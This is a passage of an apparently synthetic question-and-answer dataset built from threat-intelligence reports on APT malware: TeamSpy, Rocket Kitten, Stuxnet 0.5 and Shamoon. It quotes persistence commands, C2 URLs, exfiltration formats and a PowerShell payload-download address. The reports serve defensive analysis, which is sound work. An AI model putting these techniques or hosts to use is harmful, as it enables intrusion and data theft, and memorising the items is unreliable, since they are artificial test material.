Users\\Application Data && attrib -H /s a-t_name.exe && rename a-t_name.exe ie.exe\"\ncmd.exe /c cd C:\\Documents and Settings\\All Users\\Application Data && rename ie.exe iexplore.exe\"\nThis process immediately communicates with its hardcoded C2 at hxxp://www.politnews.org/dd_4.php and hxxp://www.bannetwork.org/dd_4.php, registering a unique identifier with its C2. It enumerates through process windows, looking for Internet Explorer processes and subclasses the window to steal all web browsing content and write it to c:\\documents and settings\\All Users\\Application Data\\sys32dll.txt, encrypting the data and sending stolen data back to the C2.\n\nQ: How does the TeamSpy crew's module ensure persistence and concealment on the infected system? Describe the steps it takes to achieve these objectives and explain the significance of each step.",
    "output": "A: The TeamSpy crew's module ensures persistence and concealment through several steps. First, it copies itself to the 'C:\\\\Documents and Settings\\\\All Users\\\\Application Data' directory under the name 'a-t_name.exe'. It then applies hidden attributes to this file using the 'attrib -H /s' command to hide it from casual inspection. The module renames the file to 'ie.exe' and subsequently to 'iexplore.exe', likely to mimic legitimate system files and avoid detection. Additionally, it adds a run key for itself, ensuring that the module starts automatically whenever the system boots up. These steps are significant because they allow the malware to remain active and undetected on the system, enabling long-term surveillance and data theft.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 5 Conclusion and Recommendations\nUkraine is vulnerable to Russia, both in traditional geopolitical space and in cyberspace. In 2015, Ukrainians are still dependent on Russian web resources, including social media (Vkontakte), email (Mail.ru), search engines (Yandex), antivirus software (Kaspersky), and much more. Our IT supply chain acquires hardware that is either produced in Russia or travels through Russia \u2013 this creates vulnerabilities out of the box, and facilitates future attacks.\nWhereas Russia is a world leader in cyber espionage and attack, Ukraine's security services are new and inexperienced. In the current conflict with Russia, the only option available to Ukraine is simply a self-inflicted denial-of-service: block access to pro-Russian sites, remove access to Russian TV channels, limit the use of Russian hardware and software, ban mobile phone and social network usage for Ukrainian soldiers, and sever network access with occupied eastern Ukraine.\nIn the future, Ukraine must modernise its cyber security legislation. One critical aspect of that process will be transparency: it must publish proposed and new laws on government websites so that they are easy to read and understand. In the past, even the few websites available were often knocked offline by hackers.\nThere have been many lessons learned. Here are some of the author's personal recommendations to the Ukrainian Government:\n\u2022 Clear Ukrainian IP space of botnets and misconfigured servers (NTP, DNS, etc.) that facilitate cyber attacks;\n\u2022 Remove illegal and pirated software from critical infrastructure and public agencies;\n\u2022 Reduce Ukraine's IT dependency in the context of crisis scenarios;\n\u2022 Implement continuity standards for media and telecoms in conflict zones;\n\u2022 Create mechanisms to reliably deliver messages from the government to its citizens in occupied territories;\n\u2022 Incorporate anti-DDoS solutions into Internet-facing services;\n\u2022 Ensure multiple, independent routes for internet traffic between Ukraine and the rest of the world;\n\u2022 Implement effective filtering mechanisms on national traffic exchange points;\n\u2022 Develop a culture of continuous cyber attack monitoring, investigation, information sharing, and research;\n\u2022 Develop strong cyber security and cryptography capabilities across Ukraine;\n\u2022 Implement effective civil society controls over unauthorised interception and collection of data;\n\u2022 Improve emergency data erasure and disaster recovery capabilities;\n\u2022 Provide resources to military and security services to effectively conduct large-scale cyber operations and computer forensics during their missions; and\n\u2022 Ensure supply chain security for IT services coming from Russia.\nFinally, the world should not underestimate Russia, which is seeking to re-establish its former empire, to include Ukraine and other parts of the defunct Soviet Union and Warsaw Pact. In the context of its wide-ranging political and military campaigns, Russia has developed a cyber attack capability that can target national critical infrastructures, via the internet, anywhere in the world.\nSmall Headline: 1 Introduction\n'Cyber attacks' and 'cyber war' are all too often characterised as independent phenomena limited to the cyber domain, somehow distinct from the broader dynamics that define a conflict. An analysis of cyber conflict thus far suggests that such a perceived dichotomy is both inaccurate and unwise. Targeted internet-based assaults cannot be divorced from their underlying geopolitical contexts, and there is small likelihood that a 'cyber war' will ever take place that is limited only to the cyber domain. On the contrary, governments have been shown to use cyber tools and tactics as a broad instrument of statecraft, a tool for coercion, and a complement to kinetic forces in conflict scenarios.\nMoscow's strategy in Ukraine has included a substantial investment in espionage and information operations, relying on the success of integrated cyber operations and computer network exploitation in particular. Russian cyber activities have included cyber espionage, 'prepping the battlefield', selective telegraphing of capabilities, and some hints at destructive activity. Together, these operations have no doubt inexorably contributed to Moscow's advantages over Kyiv, both on the ground and in shaping the con-\nMoscow's strategy in Ukraine has included a substantial investment in information operations.\nflict's narrative in the public arena. This orchestration should come as no surprise to Russian security analysts, as such an integrated approach is consistent with published Russian military doctrine. Russian strategic thinkers do not consider 'cyber war' (or even the prefix 'cyber') as a distinct concept. Rather, computer network operations are tools to be integrated into broader efforts to maintain political and military dominance in a given theatre and, more broadly, in the domestic and global courts of public opinion.\nThis chapter will ground strategic thinking on cyber conflict against the systematic cyber espionage that we believe Russia is leveraging in its conflict with Ukraine. Rather than a 'cyber war' waged in a distinct networked domain, Russia's strategy has been to masterfully exploit the information gleaned from its worldwide computer network exploitation campaigns to inform its conduct, purposely distort public opinion, and maintain its dominant position in Ukraine.\nThe author will examine three types of interrelated Russian cyber operations from a technical and targeting perspective:\n1. Computer network exploitation (CNE) to gain a decisive information advantage;\n2. 'Prepping the battlefield' via denial and deception; and\n3. Limited incidents of cyber disruption and destruction.\nSmall Headline: 2 The Architecture and Artistry of Russia's Strategic Information Theft\nSince the start of the Ukraine conflict, security companies have been increasingly tracking, cataloguing, and exposing sustained Russian CNE campaigns. Overall these Russian cyber threat groups have consistently focused on clandestinely stealing intelligence, most likely to give the Russian Government a strategic advantage. The targets of these operations have repeatedly included Ukrainian, European, and U.S. government targets, militaries, international and regional defence and political organisations, think tanks, media outlets, and dissidents. While it is difficult to assess with certainty whether these cyber threat groups are directly tasked or supported by Moscow, there is a growing body of evidence indicating these cyber actors are Russia-based, and that their activities highly likely benefit Moscow.\nThe security community's ability to detect, track, and ultimately expose Russian cyber operations seems to have improved since the Ukraine conflict began, even relative to overall trends in the industry on exposing threat activity. While determining a direct causation between the conflict in Ukraine and a seemingly marked uptick in observable Russian cyber activity is challenging, the timing is certainly notable. It is exceedingly unlikely that Russian actors only just started conducting aggressive CNE\non a global scale, so why has our ability to track and expose their activity appear to have improved? One reason may be that Russia's current national security crisis has increased its government's collections requirements to state-supported hackers, which has in turn accelerated the groups' operational tempo. As a result, it may be more difficult for these actors to modify their tactics, techniques, and procedures (TTPs) on a timely basis, which often results in them tipping their hand.\nTo shed light on how this sustained information theft is being carried out, the following sections discuss some of the cyber tactics and compromised computer infrastructure that FireEye has associated with two prominent hacker groups that we believe operate from Russia, as well as a summary list of CNE-related activity that is likely being used to give Moscow a geopolitical and military advantage.\nSmall Headline: 3 APT29 ('Advanced Persistent Threat'1 Group 29)\nAPT29 is a sophisticated and highly capable Russian cyber espionage group with a diverse, constantly evolving toolset, and talented operators. The group maintains a globally dispersed and intricate attack infrastructure that doubtless requires substantial resources to maintain. APT29's tools often leverage legitimate web services for malware command and control mechanisms, which can make them more difficult to detect because they appear to be benign communications at first glance.\nAPT29 is a highly capable Russian cyber espionage group with a constantly evolving toolset.\nVery\nQ: How does Russia integrate cyber operations into its broader military and political strategies, and what specific tactics have been observed?",
    "output": "Russia integrates cyber operations into its broader military and political strategies by using them as tools for espionage, information operations, and maintaining political and military dominance. Specific tactics observed include computer network exploitation (CNE) to gain a decisive information advantage, 'prepping the battlefield' via denial and deception, and limited incidents of cyber disruption and destruction. These operations are designed to inform Russia's conduct, distort public opinion, and maintain its dominant position in Ukraine, consistent with published Russian military doctrine.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Keylogger\nKeylogger stores keystrokes to the following file:\n%TEMP%\\log%d.txt\nHere is a sample of malware key-log output:\n(((((((Hello new File)))))))))\n+++++++++++++\nWindow= VMware Accelerated AMD PCNet Adapter (Microsoft's Packet Scheduler) : Capturing - Wireshark\n+++++++++++++\n[UP][DOWN][DOWN][UP][UP][DOWN][UP][DOWN][DOWN][UP][UP][DOWN][DOWN][DOWN][UP][UP][UP][UP] [DOWN][DOWN][DOWN][DOWN]r\n+++++++++++++\nWindow= Run\n+++++++++++++\ncmd[ENTER]\n+++++++++++++\nWindow= C:\\WINDOWS\\system32\\cmd.exe\n+++++++++++++\nnotepad[ENTER]\n+++++++++++++\nWindow= VMware Accelerated AMD PCNet Adapter (Microsoft's Packet Scheduler) : Capturing - Wireshark\n+++++++++++++\n[DOWN][UP]\n+++++++++++++\nWindow= Untitled - Notepad\n+++++++++++++\ntest test test\n+++++++++++++\nThis file will be sent to remote C&C server later on.\nIf the malware detects an open \"Gmail\", \"Yahoo\" or \"Outlook\" window, it will add special processing so the attacker can easily recognize the data that is the most valuable to him. The following string will be appended to the output file:\n\\r/////////////\\r\\nMail Find\nMedium Headline: Traffic Monitoring\nThe malware may sniff all TCP and UDP traffic on the machine. This is achieved through the use of RAW sockets. The following status strings can be sent to the C&C server:\nInitializing Winsock 2.2...\nCreating RAW socket...\nConfiguring socket for packet interception\nStarting the sniffing process...\nUDP Packet Information:\nSource IP: %s DESTINATION IP: %s\nSOURCE PORT: %d DESTINATION PORT: %d\nPACKET DATA:\n#############################################################\nTCP Packet Information:\nSource IP: %s DESTINATION IP: %s\nSOURCE PORT: %d DESTINATION PORT: %d\n#############################################################\nIf the current user privileges are insufficient for such action, the following error is presented:\nthe processs is not admin try after restart to while mpkProcess To Admin...\nMedium Headline: File Exfiltration\nThe malware may exfiltrate any file to the remote C&C server. The malware also contains the ability to enumerate all files on the system or find a specific file with the required filename specified by the operator.\nUpon file exfiltration, the file is checked for size. This is performed in order to send the file in 4Kb 'chunks', where each chunk frame is sized 0x1014h bytes.\nBefore uploading any file to the C&C server, the malware will report its size:\nAfter sending each chunk, the malware will report the current transfer status:\n%d Bytes / %d Bytes\nWhen the transfer will be finished, it will report completion using the following string:\nCompleted: %d Bytes Downloaded.\nIf there was any problem, this string will be reported:\nFailed to open %s, %s not found.\nSmall Headline: 123456\nFile-exfiltration packets are 0x1014h bytes long. The first 2 bytes indicate the type of file to be exfiltrated:\n\u2022 0811h\u2014logs (initial packet)\n\u2022 0810h\u2014logs (subsequent packets)\n\u2022 080Fh\u2014logs (final packet)\n\u2022 0BCDh\u2014webcam images (initial packet)\n\u2022 0BCFh\u2014webcam images (subsequent packets)\n\u2022 0BCEh\u2014webcam images (final packet)\n\u2022 0803h\u2014screenshots (initial packet)\n\u2022 0805h\u2014screenshots (subsequent packets)\n\u2022 0804h\u2014screenshots (final packet)\n\u2022 13C2h\u2014error with file\nThe filename is located at offset 0x08h of the first packet. Subsequent packets include file contents only.\nThe Check Point Incident Response Team is available to investigate and resolve complex security events that span from malware events, intrusions or denial of service attacks.\nThe team is available 24x7x365 by contacting emergency-response@checkpoint.com or calling 866-923-0907\n\u00a92015 Check Point Software Technologies Ltd. All rights reserved.\n\nQ: Explain the process by which the Rocket Kitten malware performs traffic monitoring and how it handles insufficient user privileges.",
    "output": "A: The Rocket Kitten malware can sniff all TCP and UDP traffic on the infected machine using RAW sockets. It sends status strings to the C&C server indicating the initialization and progress of the sniffing process, such as 'Initializing Winsock 2.2...', 'Creating RAW socket...', and 'Starting the sniffing process...'. If the user privileges are insufficient for creating RAW sockets, the malware presents an error message: 'the processs is not admin try after restart to while mpkProcess To Admin...'. This indicates that the malware requires administrative privileges to perform traffic monitoring effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: LIST\t OF\t DEOBFUSCATED STRINGS FOUND WITHIN 'NATEON.EXE'\nStrings inside 'nateon.exe' are stored in an obfuscated form and only deobfuscated as,\t and\t while, they\t are needed. This\t table contains a complete list of deobfuscated strings extracted during static binary\t analysis\t of the malicious file.\t For each\t string,\t two addresses are provided\t \u2013 the 'Code Address' and the 'Obfuscated\t Address'. The 'Code Address' is\t the address,\t in code,\t from\t which\t the string\t deobfuscation is requested.\t This\t address can be used\t to efficiently\t identify wrapper functions that dynamically import system APIs (such as those used for network communications),\t as well as to locate interesting\t parts of the malware.\t The 'Obfuscated\t Address' is\t the address,\t in data,\t where the obfuscated\t string\t is\t stored.\nFor readability,\t the strings presented\t in the 'Deobfuscated\t String' column have been converted from their original formats. Some of\t the strings are stored\t inside 'nateon.exe' as 8\u00adbit character strings and some as 16\u00adbit wide character strings.\t Non\u00adprintable characters have been escaped as hexadecimal values in the form\t '<\\xHH>' or '<\\uHHHH>'.\t Trailing\t null ('<\\x00>') characters are not\t shown.\t Standard\t escape sequences such\t as '\\n' (newline) and '\\r' (carriage return) are also used\t to improve readability.\n51 SMI, SMU, SMRAC, SMRACU are the operating\t modes of 'nateon.exe'. (Hauri \u00adResponse Team, 2011)\n52 The strings\t with suffix '.dll' identify modules loaded dynamically by the malware.\n53 The imported functions with an 'SQL' prefix were presumably used to access\t the SK Communications\t databases.\n54 The unusual hardcoded registry key 'SOFTWARE\\CLASSES\\SAFEGUI'\t can be used to link 'nateon.exe' with the malware that has\t the MD5\t hash 6C6A DBD0 8727 6AE8 9F82\t 6258 2798 B708 and calls back to the domain 'expre.dyndns.tv' on TCP port 443.\t It may also be used\t as\t a signature to identify other similar malware. (GFI SandBox, 2011)\n55 The 'nateon.exe' dropper configures\t 'winsvcfs.dll' to run inside the trusted\t operating\tsystem process 'svchost.exe'.\n56 The hardcoded domain name 'download.windowsupdate.com' is\t used\t to detect internet connectivity. This domain name can be overridden in the malware's configuration.\n57 This\t set of hardcoded\t strings, 'XXXXXXXX', 'DEMO', 'TVT', 'TVT DEMO', and '192.168.0.200' are hardcoded values\t overridden by the malware's\t configuration.\n58 The string\t 'CONFIG\u00adDESTORY!'\t is displayed\t in a message box when 'nateon.exe'\t detects\t corruption in its\t configuration. It can be used as\t a signature to identify similar malware.\n59 The unusual hardcoded registry key 'Software\\SafeSvc'\t can be used as\t a signature to identify similar malware.\n60 This\t is\t the user\u00adagent included\t in HTTP\t requests\t made by the malware to its\t configured\t command\t and control infrastructure. This\t malformed\t user\u00adagent string can be used\t as\t a signature to detect malicious network\t traffic.\n61 This is the path included in HTTP\t requests made by 'nateon.exe' to its\t configured\t command\t and control infrastructure. This string can be used as\t a signature to detect malicious\t network\t activity.\n62 The HTTP headers 'X\u00adSession', 'X\u00adStatus', 'X\u00adSize', and\t 'X\u00adSn'\t can be used\t to develop stronger signatures for detection of network activity generated\tby the malware.\n\nAnswer this question based on the above context: What are some of the key indicators within 'nateon.exe' that can be used to identify and link it to other malicious activities? How can these indicators aid in developing detection signatures?",
    "output": "Several key indicators within 'nateon.exe' can be used to identify and link it to other malicious activities. These include the unusual hardcoded registry keys 'SOFTWARE\\CLASSES\\SAFEGUI' and 'Software\\SafeSvc', which serve as signatures for identifying similar malware. Additionally, the hardcoded domain name 'download.windowsupdate.com', used to detect internet connectivity, and the string 'CONFIG-DESTROY!', displayed when configuration corruption is detected, are unique identifiers. The malformed user-agent string and specific HTTP headers ('X-Session', 'X-Status', 'X-Size', and 'X-Sn') used in network communications can also be leveraged to develop stronger signatures for detecting malicious network traffic. These indicators provide valuable insights for creating effective detection mechanisms and linking related malware campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Evolution\nStuxnet 0.5 was submitted to a malware scanning service in Version November 2007 and could have 0.500 began operation as early as November 2005. This version is 0.500 designed to stop compromising 0.500 computers on July 4, 2009, and 1.001 stop communicating with its 1.100 command-and-control (C&C) servers on an earlier date of 1.101 January 11 that same year. The 1.x compile timestamps found within most of the code appear unreliable and generally are in the range of the year 2001.\nBased on an internal version number this version of Stuxnet is 0.5, the earliest known version of the Stuxnet family.\nThe only method of replication in Stuxnet 0.5 is through infection of Siemens Step 7 project files. Stuxnet 0.5 does not exploit any Microsoft vulnerabilities, unlike versions 1.x which came later.\nThere are differences in exploited vulnerabilities and spreading mechanisms between Stuxnet versions.\nStuxnet 0.5 is partly based on the Flamer platform whereas 1.x versions were based primarily on the Tilded platform. Over time, the developers appear to have migrated more towards the Tilded platform. The developers actually re-implemented Flamer-platform components using the Tilded platform in later versions.\nBoth the Flamer and Tilded platform code bases are different enough to suggest different developers were involved.\nStuxnet 0.5 also contains code to attack the valve systems in a uranium enrichment facility rather than modifying centrifuge speeds, as in versions 1.x of Stuxnet.\nBig Headline: Installation and load point\nStuxnet 0.5 arrives as an infected Step 7 project archive containing both the s7hkimdb.dll and XR000001.MDX files. Using the (<http://www.securityfocus.com/bid/54651>)Multiple Siemens SIMATIC Products DLL Loading Arbitrary Code Execution Vulnerability (CVE-2012-3015), the S7hkimdb.dll file is executed, which then decrypts and injects the main XR00001.MDX Stuxnet binary file into the services.exe process. Stuxnet is now executing on the system.\nOnce injected into the services.exe process, a copy of the main Stuxnet binary and a companion DLL that implements the payload are saved to disk in encrypted form along with a MRXCLS.SYS load point driver.  The main Stuxnet binary refers to itself as outbreak.dll and is saved to disk as oem7a.pnf.  The companion DLL that implements the payload refers to itself as installation.dll and saved to disk as oem7w.pnf.  When the system is booted, the MRXCLS.SYS load point driver will decrypt configuration data stored in the registry, decrypt the main Stuxnet binary, and inject it into the Explorer and Step 7 processes. The payload DLL will be decrypted as well and injected into the Explorer process. When loading dynamic-link library (DLL) resources, Stuxnet makes use of a module that mimics LoadLibrary rather than calling LoadLibrary itself. This technique is likely used to avoid security software and was not seen in versions 1.x of Stuxnet.\nA second driver, PCIBUS.SYS, is also created which causes a forced reboot by generating a BSoD (Blue Screen of Death) 20 days after installation.\nA third driver, USBACC11.SYS, is then installed. This driver is similar to the MRXCLS.SYS driver, but instead decrypts and injects DLLs for peer-to-peer and C&C communication into the svchost.exe and Internet Explorer processes.\nThe structure and organization as well as resource and export listings of each component is available in Appendix D.\nStuxnet 0.5 also checks the current date in a variety of code paths and will not continue to spread after July 4, 2009. Certain modules may also not be created or loaded if security software is present. A list is available in Appendix B.\nA variety of additional files are created, including log files and configuration files. A list is available in Appendix A.\nBig Headline: Replication\nStuxnet 0.5 uses one form of replication through Step 7 project archives. When a removable drive is inserted in an infected system, Stuxnet 0.5 will infect any Step 7 project archives with a .s7p or .zip file name extension on the drive. In addition, Step 7 project archives on the local disk will also be infected.\nTherefore Stuxnet 0.5 spreads to additional machines through removable drives or through human-initiated sharing of infected Step 7 project archives, for example through email.\nStuxnet 0.5 infects Step 7 project archives in the same manner as Stuxnet 1.x versions (as described in (<http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf>)W32.\nApiLog/Types \u2013 modified to trigger DLL loading vulnerability\nXUTILS/links/S7P00001.DBF \u2013 configuration file XUTILS/listen/S7000001.MDX \u2013 payload DLL (installation.dll)\nXUTILS/listen/XR000000.MDX \u2013 main Stuxnet binary (outbreak.dll) hOmSave7/subfolder/s7hkimdb.dll - loader\nBig Headline: Command-and-control\nSimilar to Stuxnet 1.x versions, Stuxnet 0.5 has limited command-and-control ability. In particular, Stuxnet 0.5 does not provide fine grained control to its authors. Instead, Stuxnet 0.5 can only download new code and update itself. Stuxnet needs to ultimately spread on isolated networks with no Internet access, therefore it has been designed to be autonomous to reduce the need for robust and fine grained command-and-control. Stuxnet 0.5 also uses a secondary peer-to-peer mechanism to propagate these code updates to peers on networks inaccessible to the broader Internet.\nCommand-and-control is implemented by the inetpsp.dll file while peer-to-peer communications are implemented by the netsimp32.dll file. Both files are loaded by the usbacc11.sys driver and then injected into the svchost.exe and iexplore.exe processes.\nStuxnet 0.5 has four C&C servers, all of which are now either unavailable or have since been registered by an unrelated party:\n\u2022 smartclick.org\n\u2022 best-advertising.net\n\u2022 internetadvertising4u.com\n\u2022 ad-marketing.net\nInterestingly, Stuxnet 0.5 is programmed to stop contacting the C&C server after January 11, 2009, even though the threat is programmed to only stop spreading after a later date of July 4, 2009.\nThe C&C server domains were created in 2005 and all displayed the same front page purporting to be an Internet advertising agency named Media Suffix (figure 1) with the tag line \"Believe What the Mind Can Dream\".\nThe servers were hosted on commercial hosting providers in the United States, Canada, France, and Thailand. The fact that these domains were in operation since 2005, suggests that the Stuxnet project started more than seven years ago.\nFigure 1\nInternet advertising agency homepage for Stuxnet C&C servers\nThe first request by Stuxnet 0.5 uses the following form:\nhttp://<domain>/cgi/link.php?site=xx\nThis notifies the C&C server of an active successful infection. Next, Stuxnet 0.5 sends the following request: http://<domain>/cgi/click.php?xite=xx&num=yy&c=1&j=%x&k=%x&l=%x\nThis may download and execute a file if an update is available.\nThe final target network for Stuxnet 0.5 was likely isolated from the Internet. To allow updates to reach these machines, Stuxnet 0.5 also used a peer-to-peer mechanism. As long as one updated version was introduced into this network\u2014for example through an infected USB key\u2014all the other infected machines on the network could receive updates or new code modules.\nStuxnet 0.5 uses Windows mailslots for peer-to-peer communication. Mailslots allow a process to pass a message to another process on a remote machine. Stuxnet 0.5 enumerates all machines on the network and attempts to connect to a mailslot named \\\\[REMOTE MACHINE NAME]\\mailslot\\svchost. It then provides a callback mailslot name of \\\\[LOCAL MACHINE NAME]\\mailslot\\imnotify.\nStuxnet 0.5 uses these mailslots for peer-to-peer communication and to pass code updates. In addition, Stuxnet 0.5 may configure systems to allow anonymous logins and then provides the following file shares:\n\u2022 temp$\n\u2022 msagent$\n\u2022 SYSADMIN$\n\u2022 WebFiles$\nThis allows file retrieval by peer infections. Shared files include:\n%WinDir%\\msagent\\agentsb.dll\n%WinDir%\\msagent\\intl\\agt0f2e.dll\n%WinDir%\\system32\\complnd.dll\n%WinDir%\\system32\\dllcache\\datacprs.dll\n%WinDir%\\system32\\wbem\\perfnws.dll\n%WinDir%\\Installer\\{6F716D8C-398F-11D3-85E1-005004838609}\\places.dat\nMedium Headline: Man-in-the-Middle\nIn order to both fingerprint the target system and inject malicious Programmable Logic Controller (PLC) code, Stuxnet 0.5 replaces two Step 7 DLLs in order to hijack communications with a PLC.\nThe first DLL, s7otbxdx.dll, is hijacked in order to insert the malicious PLC code. The same technique was used in Stuxnet versions 1.x (as described in (<http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf>)W32.Stuxnet Dossier, Modifying PLCs). Stuxnet 0.5 hooks fewer exports and verifies the CPU is a 417 PLC rather than a 315 PLC, otherwise the behavior remains generally the same.\nThe second DLL, s7aaapix.dll, is used for fingerprinting the target system and building DB8061, a PLC data block needed to conduct the attack. The export AUTDoVerb is hijacked and the malicious s7otbxdx.dll file can call the export with magic values (0x91E55A3D, 0x996AB716, 0x4A5CBB03) in order to build or provide a previously built DB8061 data block for injection. Stuxnet hijacks AUTDoVerb in order to monitor any \"DOWNLOAD\" verb actions, which signifies the fingerprinting and building of DB8061 must occur again in order to ensure the target system is still correctly configured.\n\nWhat specific techniques does Stuxnet 0.5 use to hijack communications with a Programmable Logic Controller (PLC), and how does it ensure the target system is correctly configured for the attack?",
    "output": "Stuxnet 0.5 hijacks communications with a PLC by replacing two Step 7 DLLs. The first DLL, s7otbxdx.dll, is hijacked to insert the malicious PLC code. The second DLL, s7aaapix.dll, is used for fingerprinting the target system and building DB8061, a PLC data block needed to conduct the attack. Stuxnet 0.5 hooks fewer exports and verifies the CPU is a 417 PLC rather than a 315 PLC. It hijacks the AUTDoVerb export to monitor 'DOWNLOAD' verb actions, ensuring the target system is still correctly configured for the attack. This technique ensures that the malicious code is only injected into the appropriate PLC environment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do Network Denial of Service attacks, as described in the Ashmore report on alleged Russian cyber attacks, impact the cyber security of former Soviet satellite states?",
    "output": "Network Denial of Service (DoS) attacks aim to degrade or block the availability of targeted resources to users by exhausting the network bandwidth services rely on. In the context of alleged Russian cyber attacks, as detailed in the Ashmore report, Network DoS attacks have been employed to disrupt the cyber security of former Soviet satellite states. Specifically, the report highlights instances of distributed denial of service (DDoS) attacks against Estonia, Georgia, Lithuania, and Kyrgyzstan, which were allegedly linked to Russian involvement. These attacks overwhelmed the targeted countries' internet infrastructure, causing disruptions to government websites, email services, and other critical online resources. The use of botnets and IP address spoofing made it challenging to trace the origin of the attacks, increasing the difficulty in defending against them. Furthermore, the report suggests that the Russian government may have been involved in or sanctioned these attacks, which raises concerns about the potential for state-sponsored cyber aggression. Overall, Network DoS attacks pose a significant threat to the cyber security of former Soviet satellite states, highlighting the need for robust defense mechanisms and international cooperation to counter such threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Introduction\nThe use of software vulnerabilities in order to execute malicious software on unsuspecting users\u2022 computers is an important parameter to monitor. This method of attack is not only known to have a considerable success rate, it is also often deployed by resourceful attackers and, as such, marks a threat worth paying attention to.\nThe use of exploits in document formats like PDF, DOC and RTF is in some ways especially noteworthy. Documents are commonly exchanged via mail, which make them perfect for email-borne targeted attacks; what is otherwise known as spear phishing.\nIn March, 2014, Microsoft published information about a new vulnerability in Rich Text Format (RTF). This vulnerability, named CVE-2014-1761 (Microsoft Word RTF Object Confusion), had already been used effectively by attackers at the time of the announcement. Two previous vulnerabilities in the RTF file format, known as CVE-2010-3333 and CVE-2012-0158, had become, by that time, mainstays of targeted attacks, so we tracked how attackers implemented this new exploit with keen interest.\nBy late August, we identified a malware espionage operation that used both the CVE-2014-1761 and CVE-2012-0158 vulnerabilities to trigger execution of the malicious payload, and which leveraged a single cloud service as the backbone of its entire visible infrastructure.\nWhen we examined the suspicious documents, it was discovered that they were somewhat anomalous compared to the run-of-the-mill material. They turned out to belong to a highly advanced and professional targeted attack framework, which utilized a complex series of techniques to survey potential targets.\nDue to the many levels of obfuscation and indirection, we named this the Inception framework; but there ends all similarity with the movie by the same name. Leonardo DiCaprio is not associated with this investigation.\n\nQuestion: How did the Inception framework leverage the CVE-2014-1761 and CVE-2012-0158 vulnerabilities to execute its malicious payload, and what made this framework particularly advanced and professional?\n\nAnswer:",
    "output": "The Inception framework utilized both the CVE-2014-1761 (Microsoft Word RTF Object Confusion) and CVE-2012-0158 vulnerabilities to trigger the execution of its malicious payload. These vulnerabilities allowed the attackers to exploit weaknesses in the RTF file format, which is commonly used in document exchange via email, making it ideal for spear phishing attacks. What set this framework apart as highly advanced and professional was its use of a complex series of techniques to survey potential targets. The framework employed multiple levels of obfuscation and indirection, making it difficult to detect and analyze. Additionally, the entire visible infrastructure of the attack was leveraged through a single cloud service, showcasing the sophistication and resourcefulness of the attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Shamoon Attacks Preceded by Malicious Macros and PowerShell Commands\nSince Shamoon incidents feature the infiltration and escalation stages of targeted attacks, X-Force IRIS responders sought out the attackers' entry point. Their findings pointed to what appears to be the initial point of compromise the attackers used: a document containing a malicious macro that, when approved to execute, enabled C2 communications to the attacker's server and remote shell via PowerShell.\nThe document was not the only one discovered in the recent attack waves. X-Force IRIS researchers had been tracking earlier activity associated with similar malicious, PowerShell-laden documents themed as resumes and human resources documents, some of which related to organizations in Saudi Arabia. This research identified several bouts of offensive activity that occurred in the past few months, which revealed similar operational methods in which the attackers served malicious documents and other malware executables from web servers to their targets to establish an initial foothold in the network.\nBig Headline: Initial Compromise Vector Previously Unclear\nAlthough Shamoon was previously documented in research blogs, the specific (<http://www.ibm.com/software/products/en/category/infrastructure-protection?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US>)network compromise methods leading to the attacks have remained unclear in the reported cases. X-Force IRIS researchers studied Shamoon's attack life cycle and observed its tactics at Saudi-based organizations and private sector companies. This research led them to believe that the actor using Shamoon in recent attacks relied heavily on weaponized documents built to leverage PowerShell to establish their initial network foothold and subsequent operations:\n1. Attackers send a spear phishing email to employees at the target organization. The email contains a Microsoft Office document as an attachment.\n2. Opening the attachment from the email invokes PowerShell and enables command line access to the compromised machine.\n3. Attackers can now communicate with the compromised machine and remotely execute commands on it.\n4. The attackers use their access to deploy additional tools and malware to other endpoints or escalate privileges in the network.\n5. Attackers study the network by connecting to additional systems and locating critical servers.\n6. The attackers deploy the Shamoon malware.\n7. A coordinated Shamoon outbreak begins and computer hard drives across the organization are permanently wiped.\nBig Headline: A Phish Is Speared\nOur researchers examined the domain that hosted the first malicious file, mol.com-ho[.]me. Per the domain's WHOIS record, an anonymized registrant registered com-ho[.]me in October 2016 and used it to serve malicious documents with similar (<https://securityintelligence.com/vba-macro-malware-jumping-on-the-ransomware-bandwagon/>)macro activation features. The following list of documents included:\nThese files were most likely delivered via spear phishing emails to lure employees into unwittingly launching the malicious payload.\nA closer review of the file names revealed \"IT Worx\" and \"MCI.\" A search of the name IT Worx brings up a global software professional services organization headquartered in Egypt. MCI is Saudi Arabia's Ministry of Commerce and Investment. It is possible these names were used in spear phishing emails because they would seem benign to Saudi-based employees and lure them to open the attachment.\nX-Force IRIS researchers further identified that the threat actor behind the malicious documents served many of them using a URL-shortening scheme in the following pattern: briefl[.]ink/{a-z0-9}[5].\nThe following figure is a visual example of what employees may have encountered when they opened the malicious Word files sent to them in preparation for a Shamoon attack:\nPassive DNS results on a communications domain associated with the Shamoon attack revealed related network infrastructure, identifying additional domains used by the threat actors.\nX-Force IRIS discovered that the threat actor was hosting at least one malicious executable on a server hosted on ntg-sa[.]com. This file duped targets into believing it was a Flash player installer that would drop a Windows batch to invoke PowerShell into the same C2 communications.\nBig Headline: Breakdown of the PowerShell-Related Macro\nAnalysis of one of the threat actor's documents found that if the macro executes, it launches two separate PowerShell Scripts. The first one executes a PowerShell script served from hxxp://139.59.46.154:3485/eiloShaegae1. The host is possibly related to attacks that served the (<https://github.com/n1nj4sec/pupy>)Pupy RAT, a publicly available cross-platform remote access tool.\nThe second script calls VirtualAlloc to create a buffer, uses memset to load Metasploit-related shellcode into that buffer and executes it through CreateThread. Metasploit is an open source framework popular as a tool for developing and executing exploit code against a remote target machine. The shellcode performs a DWORD XOR of 4 bytes at an offset from the beginning of the shellcode that changes the code to create a loop so the XOR continues 0x57 times.\nIf 